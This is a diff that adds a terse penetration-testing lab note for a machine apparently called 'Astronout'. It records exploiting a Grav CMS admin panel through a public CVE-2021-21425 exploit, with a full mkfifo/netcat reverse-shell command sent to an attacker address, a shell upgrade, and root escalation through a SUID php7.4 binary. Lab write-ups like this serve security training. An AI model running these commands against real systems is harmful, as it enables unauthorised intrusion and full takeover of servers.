@@ -1,0 +1,23 @@
+Astronout http://192.168.159.12
+
+access http://192.168.159.12/
+found /grav-admin/
+GRAV cms is running searched for exploit
+
+https://www.exploit-db.com/exploits/49973
+https://github.com/CsEnox/CVE-2021-21425/blob/main/exploit.py
+
+python3 grav_exploit.py -t http://192.168.159.12/grav-admin -c id 
+Executed but failed.
+
+python3 grav_exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.173 80 >/tmp/f' -t http://192.168.159.12/grav-admin
+
+on kali 
+nc -nvlp 80  
+which python3
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+find SUID set for /usr/bin/php7.4
+
+https://gtfobins.github.io/gtfobins/php/#suid
+/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
